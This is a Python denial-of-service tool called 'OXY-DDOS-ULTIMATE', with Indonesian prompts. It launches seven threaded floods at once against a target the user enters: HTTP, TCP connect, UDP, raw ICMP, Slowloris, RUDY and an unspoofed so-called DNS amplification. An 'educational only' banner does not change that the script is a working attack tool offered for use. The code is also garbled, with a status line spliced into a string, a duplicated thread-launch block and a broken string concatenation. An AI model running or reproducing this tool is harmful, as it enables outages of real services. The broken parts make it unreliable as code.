#!/usr/bin/env python3

# ============================================================

# OXY-DDOS-ULTIMATE v2.0 - 7 LAYER GABUNGAN

# BY OXY & TUAN KEPALA CPY

# ============================================================

# 🔥 SEMUA LAYER JALAN BERSAMAAN:

# 1. HTTP Flood (Layer 7)

# 2. SYN Flood (Layer 4)

# 3. UDP Flood (Layer 4)

# 4. ICMP Flood (Layer 3)

# 5. Slowloris (Layer 7)

# 6. RUDY Attack (Layer 7)

# 7. DNS Amplification (Layer 3/4)

# ============================================================



import socket

import random

import threading

import time

import requests

import sys

import os

import ssl

import urllib3

from urllib.parse import urlparse

import hashlib

import base64

import re

import struct



urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)



# ============================================================

# BANNER

# ============================================================

def banner():

    os.system('clear' if os.name == 'posix' else 'cls')

    print("""

    ╔═══════════════════════════════════════════════════════════╗

    ║   💀🔥 OXY-DDOS-ULTIMATE v2.0 - 7 LAYER GABUNGAN 🔥💀  ║

    ║   BY OXY & TUAN KEPALA CPY                               ║

    ║   ⚠️  HANYA UNTUK TUJUAN PEMBELAJARAN! ⚠️               ║

    ║   ⚠️  JANGAN DIGUNAKAN UNTUK HAL ILEGAL! ⚠️            ║

    ║   🔥 7 LAYER JALAN BERSAMAAN → MAKIN DOWN! 🔥           ║

    ╚═══════════════════════════════════════════════════════════╝

    """)



# ============================================================

# KONFIGURASI

# ============================================================

USER_AGENTS = [

    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",

    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",

    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0",

    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0",

    "Mozilla/5.0 (iPhone; CPU iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",

    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 Chrome/120.0.0.0"

]



class DDOSUltimate:

    def __init__(self, target, port=80, duration=60, threads=100):

        self.target = target

        self.port = port

        self.duration = duration

        self.threads = threads

        self.stop_flag = False

        self.stats = {

            "http": 0,

            "syn": 0,

            "udp": 0,

            "icmp": 0,

            "slowloris": 0,

            "rudy": 0,

            "dns": 0

        }



    # ============================================================

    # LAYER 1: HTTP FLOOD

    # ============================================================

    def http_flood(self):

        headers = {

            "User-Agent": random.choice(USER_AGENTS),

            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",

            "Accept-Language": "en-US,en;q=0.5",

            "Connection": "keep-alive",

            "Cache-Control": "no-cache",

            "Upgrade-Insecure-Requests": "1"

        }

        

        while not self.stop_flag:

            try:

                paths = ["/", "/index.php", "/admin", "/api", "/login", "/wp-admin", "/test", "/ping"]

                path = random.choice(paths)

                url = f"http://{self.target}:{self.port}{path}"

                

                params = {

                    "id": random.randint(1, 9999),

                    "page": random.randint(1, 100),

                    "q": hashlib.md5(str(random.random()).encode()).hexdigest()[:8]

                }

                

                if random.choice([True, False]):

                    requests.get(url, headers=headers, params=params, timeout=3, verify=False)

                else:

                    data = {"user": f"user_{random.randint(1,9999)}", "pass": hashlib.md5(str(random.random()).encode()).hexdigest()[:10]}

                    requests.post(url, headers=headers, data=data, timeout=3, verify=False)

                

                self.stats["http"] += 1

            except:

                pass

            time.sleep(random.uniform(0.01, 0.05))



    # ============================================================

    # LAYER 2: SYN FLOOD

    # ============================================================

    def syn_flood(self):

        while not self.stop_flag:

            try:

                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                sock.settimeout(1)

                sock.connect((self.target, self.port))

                sock.send(b"SYN" * 1024)

                sock.close()

                self.stats["syn"] += 1

            except:

                pass

            time.sleep(random.uniform(0.001, 0.01))



    # ============================================================

    # LAYER 3: UDP FLOOD

    # ============================================================

    def udp_flood(self):

        try:

            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

            data = os.urandom(65500)

            while not self.stop_flag:

                try:

                    sock.sendto(data, (self.target, self.port))

                    self.stats["udp"] += 1

                except:

                    sock.close()

                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

                time.sleep(random.uniform(0.001, 0.005))

        except:

            pass



    # ============================================================

    # LAYER 4: ICMP FLOOD

    # ============================================================

    def icmp_flood(self):

        while not self.stop_flag:

            try:

                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)

                data = os.urandom(65500)

                sock.sendto(data, (self.target, 0))

                sock.close()

                self.stats["icmp"] += 1

            except:

                pass

            time.sleep(random.uniform(0.001, 0.005))



    # ============================================================

    # LAYER 5: SLOWLORIS

    # ============================================================

    def slowloris(self):

        while not self.stop_flag:

            try:

                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                sock.settimeout(5)

                sock.connect((self.target, self.port))

                sock.send(f"GET /?{random.randint(1,9999)} HTTP/1.1\r\n".encode())

                sock.send(f"Host: {self.target}\r\n".encode())

                sock.send("User-Agent: Mozilla/5.0\r\n".encode())

                sock.send("Connection: keep-alive\r\n".encode())

                sock.send("X-Header: " + "a" * 1000 + "\r\n".encode())

                # Keep connection open

                time.sleep(random.uniform(1, 5))

                sock.close()

                self.stats["slowloris"] += 1

            except:

                pass

            time.sleep(random.uniform(0.1, 0.5))



    # ============================================================

    # LAYER 6: RUDY ATTACK

    # ============================================================

    def rudy_attack(self):

        while not self.stop_flag:

            try:

                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                sock.settimeout(5)

                sock.connect((self.target, self.port))

                content = "a" * 10000

                sock.send(f"POST / HTTP/1.1\r\n".encode())

                sock.send(f"Host: {self.target}\r\n".encode())

                sock.send("Content-Type: application/x-www-form-urlencoded\r\n".encode())

                sock.send(f"Content-Length: {len(content)}\r\n".encode())

                sock.send("\r\n".encode())

                # Send slowly

                for i in range(0, len(content), 10):

                    sock.send(content[i:i+10].encode())

                sock.send("\r\n".encode())

                # Send slowly

                for i in range(0, len(content), 10):

                    sock.send(content[i:i+10].encode())

                    time.sleep(random.uniform(0.1, 0.5))

                sock.close()

                self.stats["rudy"] += 1

            except:

                pass

            time.sleep(random.uniform(0.1, 0.5))



    # ============================================================

    # LAYER 7: DNS AMPLIFICATION

    # ============================================================

    def dns_amplification(self):

        dns_servers = [

            "8.8.8.8", "1.1.1.1", "208.67.222.222", "9.9.9.9",

            "64.6.64.6", "185.228.168.9", "76.76.19.19"

        ]

        

        while not self.stop_flag:

            try:

                dns_server = random.choice(dns_servers)

                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

                sock.settimeout(2)

                

                # DNS Query dengan payload besar

                domain = f"{hashlib.md5(str(random.random()).encode()).hexdigest()[:10]}.com"

                query = b"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"

                for part in domain.split('.'):

                    query += bytes([len(part)]) + part.encode()

                query += b"\x00\x00\x01\x00\x01"

                query = b"\xaa\xbb" + query

                

                sock.sendto(query, (dns_server, 53))

                sock.close()

                self.stats["dns"] += 1

            except:

                pass

            time.sleep(random.uniform(0.001, 0.01))



    # ============================================================

    # START ALL LAYERS

    # ============================================================

    def start_attack(self):

        print(f"\n[+] Target: {self.target}:{self.port}")

        print(f"[+] Durasi: {self.duration} detik")

        print(f"[+] Threads per layer: {self.threads}")

        print("\n� MEMULAI 7 LAYER SERANGAN...\n")

        

        threads = []

        

        # Layer 1: HTTP Flood

        for _ in range(self.threads):

            t = threading.Thread(target=self.http_flood)

            t.daemon = True

            t.start()

            threads.append(t)

        

        # Layer 2: SYN Flood

        for _ in range(self.threads//2):

            t = threading.Thread(target=self.syn_flood)

            t.daemon = True

            t.start()

            threads.append(t)

        

        # Layer 3: UDP Flood

        for _ in range(self.threads//2):

            t = threading.Thread(target=self.udp_flood)

            t.daemon = True

            t.start()

            threads.append(t)

        

        # Layer 4: ICMP Flood

        for _ in range(self.threads//2):

            t = threading.Thread(target=self.icmp_flood)

            t.daemon = True

            t.start()

            threads.append(t)

        

        # Layer 5: Slowloris

        for _ in range(self.threads//2):

            t = threading.Thread(target=self.slowloris)

            t.daemon = True

            t.start()

            threads.append(t)

        

        # Layer 6: RUDY

        for _ in range(self.threads//2):

            t = threading.Thread(target=self.rudy_attack)

            t.daemon = True

            t.start()

            threads.append(t)

        

        # Layer 7: DNS Amplification

        for _ in range(self.threads//2):

            t = threading.Thread(target=self.dns_amplification)

            t.daemon = True

            t.start()

            threads.append(t)

        

        # Monitor

        start_time = time.time()

        while time.time() - start_time < self.duration:

            total = sum(self.stats.values())

            sys.stdout.write(f"\r[+] Total Paket Terkirim: {total} | HTTP: {self.stats['http']} | SYN: {self.stats['syn']} | UDP: {self.stats['udp']} | ICMP: {self.stats['icmp']} | SLOW: {self.stats['slowloris']} | RUDY: {self.stats['rudy']} | DNS: MEMULAI 7 LAYER SERANGAN...\n")

        

        threads = []

        

        # Layer 1: HTTP Flood

        for _ in range(self.threads):

            t = threading.Thread(target=self.http_flood)

            t.daemon = True

            t.start()

            threads.append(t)

        

        # Layer 2: SYN Flood

        for _ in range(self.threads//2):

            t = threading.Thread(target=self.syn_flood)

            t.daemon = True

            t.start()

            threads.append(t)

        

        # Layer 3: UDP Flood

        for _ in range(self.threads//2):

            t = threading.Thread(target=self.udp_flood)

            t.daemon = True

            t.start()

            threads.append(t)

        

        # Layer 4: ICMP Flood

        for _ in range(self.threads//2):

            t = threading.Thread(target=self.icmp_flood)

            t.daemon = True

            t.start()

            threads.append(t)

        

        # Layer 5: Slowloris

        for _ in range(self.threads//2):

            t = threading.Thread(target=self.slowloris)

            t.daemon = True

            t.start()

            threads.append(t)

        

        # Layer 6: RUDY

        for _ in range(self.threads//2):

            t = threading.Thread(target=self.rudy_attack)

            t.daemon = True

            t.start()

            threads.append(t)

        

        # Layer 7: DNS Amplification

        for _ in range(self.threads//2):

            t = threading.Thread(target=self.dns_amplification)

            t.daemon = True

            t.start()

            threads.append(t)

        

        # Monitor

        start_time = time.time()

        while time.time() - start_time < self.duration:

            total = sum(self.stats.values())

            sys.stdout.write(f"\r[+] Total Paket Terkirim: {total} | HTTP: {self.stats['http']} | SYN: {self.stats['syn']} | UDP: {self.stats['udp']} | ICMP: {self.stats['icmp']} | SLOW: {self.stats['slowloris']} | RUDY: {self.stats['rudy']} | DNS: {self.stats['dns']}    ")

            sys.stdout.flush()

            time.sleep(0.5)

        

        self.stop_flag = True

        print("\n\n[+] SERANGAN SELESAI!")

        print(f"[+] Total Paket Terkirim: {sum(self.stats.values())}")



# ============================================================

# MAIN

# ============================================================

def main():

    banner()

    

    print("\n📌 CONTOH TARGET: example.com")

    target = input("[?] Masukkan Target (IP/Domain): ").strip()

    if not target:

        print("[!] Target kosong!")

        return

    

    # Parse target

    if "http://" in target:

        target = target.replace("http://", "").split("/")[0]

    if ":" in target:

        target, port = target.split(":")

        port = int(port)

    else:

        port = 80

    

    try:

        duration = int(input("[?] Durasi (detik): ") or "60")

        threads = int(input("[?] Threads per layer (default 50): ") or "50")

    except:

        duration = 60

        threads = 50

    

    # Validasi

    confirm = input(f"\n⚠️ Yakin menyerang {target}:{port} selama {duration} detik? (y/n): ")

    if confirm.lower() != 'y':

        print("[!] Dibatalkan!")

        return

    

    # Eksekusi

    ddos = DDOSUltimate(target, port, duration, threads)

    ddos.start_attack()



if __name__ == "__main__":

    main()

